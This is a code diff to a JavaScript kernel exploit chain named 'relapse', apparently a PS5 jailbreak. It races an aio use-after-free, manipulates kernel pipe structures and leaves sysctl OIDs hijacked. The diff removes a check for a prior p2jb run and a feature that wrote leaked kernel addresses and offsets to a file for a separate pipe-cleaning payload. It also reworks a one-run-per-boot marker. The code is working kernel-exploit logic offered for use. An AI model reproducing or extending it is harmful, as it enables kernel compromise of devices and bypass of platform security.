@@ -8,7 +8,6 @@ async function start_relapse() {
         const FAIL_MARKER_NAME = "relapse.fail";
         const IGNORE_FAIL_MARKER = false;
         const RESTORE_EBOOT_AFTER_HANDOFF = true;
-        const ALLOW_AFTER_P2JB = false;
         const PREPARE_FOR_KEXP = true;
         const WIDEN_EBOOT = true;
         const FHOLD_PIPES = false;
@@ -30,7 +29,6 @@ async function start_relapse() {
         const RESTORE_REAL_BUFFERS = true;
         const LEAVE_PIPES_ARMED = false;
         const PIPE_STRUCT_DIFF = false;
-        const PIPE_NOTE_FOR_CLEANER = false;
         const SKIP_OID_RESTORE = true;
         const FHOLD_AT_RESCUE = false;
         const CRASH_ARTIFACT_SCAN = false;
@@ -5221,8 +5219,7 @@ async function start_relapse() {
             const victim = this.victim.pipe;
             const { count, in: inOff, out: outOff, size, buffer } = this.off.pipe;
             this.pipeSize = this.off.pipe.defaultSize;
-            if ((typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) ||
-                (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER))
+            if (typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS)
               await this.savePipeBuffers();
             this.aimBuffer = this.alloc(0x20);
             this.drainBuffer = this.alloc(0x40);
@@ -5822,30 +5819,6 @@ async function start_relapse() {
               this.report(label, "failed: " + e.message);
             }
           }
-          async makeReferencePipe(label) {
-            try {
-              const pair = this.alloc(16);
-              this.clear(pair, 16);
-              if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
-                this.report(label, "pipe2 failed");
-                return null;
-              }
-              const readFd = this.readU32(pair, 0) | 0;
-              const writeFd = this.readU32(pair, 4) | 0;
-              this.fds.push(readFd, writeFd);
-              const fdp = await this.fptr(this.curproc.add32(this.off.proc.fd));
-              if (!fdp) { this.report(label, "no fd table"); return null; }
-              const info = await this.findPipe(fdp, readFd, "reference");
-              if (!info || !info.pipe) { this.report(label, "reference pipe unresolved"); return null; }
-              this.refPipe = info.pipe;
-              this.report(label, "reference pipe @ 0x" + info.pipe.toString() +
-                " (fds " + readFd + "/" + writeFd + ", never written)");
-              return info.pipe;
-            } catch (e) {
-              this.report(label, "failed: " + e.message);
-              return null;
-            }
-          }
           async cleanTeardown() {
             if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF && this.crossed)
               await this.dumpPipeStructs("pipe-diff-crossed", false);
@@ -6098,8 +6071,6 @@ async function start_relapse() {
                 await this.cleanTeardown();
                 return;
               }
-              if (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER)
-                await this.makeReferencePipe("pipe-ref");
               if (typeof SKIP_OID_RESTORE !== "undefined" && SKIP_OID_RESTORE)
                 this.report("Cleanup", "SKIP_OID_RESTORE: the sysctl OIDs are being left " +
                   "hijacked on purpose - diagnostic build, the window stays open");
@@ -6190,20 +6161,6 @@ async function start_relapse() {
             say("already jailbroken - nothing to do");
             return false;
         }
-        if (!ALLOW_AFTER_P2JB) {
-            const p2jb_markers = ["/user/temp/common_temp/p2jb.fail"];
-            try {
-                p2jb_markers.unshift("/" + get_nidpath() + "/common_temp/p2jb.fail");
-            } catch (_) { }
-            const hit = p2jb_markers.filter((m) => {
-                try { return file_exists(m); } catch (_) { return false; }
-            });
-            if (hit.length)
-                fatal("p2jb already ran this boot (" + hit[0] + ") but this " +
-                    "process is not jailbroken - reboot the PS5 instead of " +
-                    "racing the aio UAF on top of p2jb's kernel state " +
-                    "(or set ALLOW_AFTER_P2JB = true)");
-        }
         if (typeof read_file !== "function")
             fatal("read_file is not in scope - the kexp/elfldr delivery reads " +
                 "them from the Y2JB sandbox slot");
@@ -6218,21 +6175,18 @@ async function start_relapse() {
                     " (this major version)" : picked.known.join(", ")));
         log_now("FW " + fw + " offsets loaded (allproc rva " +
             toHex(BigInt(off.allproc)) + ", aio uaf)");
-        const marker_paths = ["/user/temp/common_temp/" + FAIL_MARKER_NAME];
-        try {
-            marker_paths.unshift("/" + get_nidpath() + "/common_temp/" + FAIL_MARKER_NAME);
-        } catch (_) { }
         let failcheck_path = null;
         try {
-            const present = marker_paths.filter((m) => {
-                try { return file_exists(m); } catch (_) { return false; }
-            });
-            if (present.length && IGNORE_FAIL_MARKER) {
-                log_now("fail marker present (" + present[0] +
+            failcheck_path = "/" + get_nidpath() + "/common_temp/" + FAIL_MARKER_NAME;
+        } catch (_) { }
+        try {
+            const present = failcheck_path ? file_exists(failcheck_path) : false;
+            if (present && IGNORE_FAIL_MARKER) {
+                log_now("fail marker present (" + failcheck_path +
                     ") but IGNORE_FAIL_MARKER is set - continuing anyway");
-            } else if (present.length) {
+            } else if (present) {
                 send_notification("relapse already ran this boot\nreboot the PS5 first");
-                say("fail marker present (" + present[0] + ") - reboot before retrying");
+                say("fail marker present (" + failcheck_path + ") - reboot before retrying");
                 return false;
             }
         } catch (_) { }
@@ -6257,14 +6211,17 @@ async function start_relapse() {
             chain.setWorkerAffinity(core, 2 /* PRI_REALTIME */);
             say("race pinned: main core " + this.pinnedCore + ", worker core " + core);
         };
-        for (const m of marker_paths) {
+        if (failcheck_path) {
             try {
-                write_file(m, "");
-                if (file_exists(m)) { failcheck_path = m; break; }
-            } catch (_) { }
+                write_file(failcheck_path, "");
+                if (!file_exists(failcheck_path)) failcheck_path = null;
+            } catch (_) {
+                failcheck_path = null;
+            }
         }
-        if (!failcheck_path) say("could not write a one-run-per-boot marker (" +
-            marker_paths.join(", ") + ") - continuing without that safety net");
+        if (failcheck_path) say("fail marker armed at " + failcheck_path);
+        else say("could not write a one-run-per-boot marker to the sandbox " +
+            "common_temp dir - continuing without that safety net");
         let result = null;
         let threw = null;
         if (STOP_AFTER === "chain") {
@@ -6321,46 +6278,6 @@ async function start_relapse() {
             };
         } catch (e) {
             log_now("could not install the status hook: " + e.message);
-        }
-        if (PIPE_NOTE_FOR_CLEANER && exploit.master && exploit.victim) {
-            try {
-                const pp = exploit.off.pipe;
-                const hex = (v) => "0x" + (v === undefined ? "e8" : v.toString(16));
-                const logip = net_log_target ? net_log_target.split(":")[0] : "";
-                const note = "logip=" + logip + "\n" +
-                    "pid=" + Number(syscall(SYSCALL.getpid)) + "\n" +
-                    "master=0x" + exploit.master.pipe.toString() + "\n" +
-                    "victim=0x" + exploit.victim.pipe.toString() + "\n" +
-                    "reference=0x" + (exploit.refPipe ? exploit.refPipe.toString() : "0") + "\n" +
-                    "kbase=0x" + (exploit.kbase ? exploit.kbase.toString() : "0") + "\n" +
-                    "allproc=0x" + exploit.kaddr(exploit.off.allproc).toString() + "\n" +
-                    "master_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.master ? exploit.savedBuffers.master.toString() : "0") + "\n" +
-                    "victim_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.victim ? exploit.savedBuffers.victim.toString() : "0") + "\n" +
-                    "pipe_size=" + (exploit.savedBuffers ? exploit.savedBuffers.masterSize : 0) + "\n" +
-                    "off_buffer=" + hex(pp.buffer) + "\n" +
-                    "off_count=" + hex(pp.count) + "\n" +
-                    "off_in=" + hex(pp.in) + "\n" +
-                    "off_out=" + hex(pp.out) + "\n" +
-                    "off_size=" + hex(pp.size) + "\n" +
-                    "off_pair=" + hex(pp.pair) + "\n";
-                const dirs = ["/user/temp/common_temp"];
-                try { dirs.unshift("/" + get_nidpath() + "/common_temp"); } catch (_) { }
-                let wrote = 0;
-                for (const d of dirs) {
-                    try {
-                        write_file(d + "/relapse-pipes.txt", note);
-                        wrote++;
-                        say("pipe note written to " + d + "/relapse-pipes.txt");
-                    } catch (e) {
-                        say("pipe note not written to " + d + ": " + e.message);
-                    }
-                }
-                if (wrote) say("pipe note: " + note.replace(/\n/g, " ") +
-                    "  <- send pipeclean.elf to :9021 to seal the pipes, then close the app");
-                else say("PIPE_NOTE_FOR_CLEANER: no writable directory for the note");
-            } catch (e) {
-                say("pipe note failed: " + e.message);
-            }
         }
         if (CRASH_ARTIFACT_SCAN) {
             try { scan_crash_artifacts(); }
